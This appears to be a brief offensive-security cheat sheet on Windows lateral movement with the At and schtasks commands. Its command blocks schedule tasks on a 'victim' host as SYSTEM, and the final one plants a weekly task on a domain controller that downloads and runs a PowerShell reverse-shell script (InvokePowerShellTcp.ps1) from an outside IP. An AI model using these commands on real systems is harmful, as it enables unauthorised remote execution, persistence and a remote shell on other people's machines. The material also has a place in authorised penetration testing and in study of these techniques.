# AtExec / SchtasksExec

## How Does it works

At allows to schedule tasks in hosts where you know username/\(password/Hash\). So, you can use it to execute commands in other hosts and get the output.

```text
At \\victim 11:00:00PM shutdown -r
```

Using schtasks you need first to create the task and then call it:

```text
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```text
schtasks /create /S dcorp-dc.my.domain.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "UserX" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
```

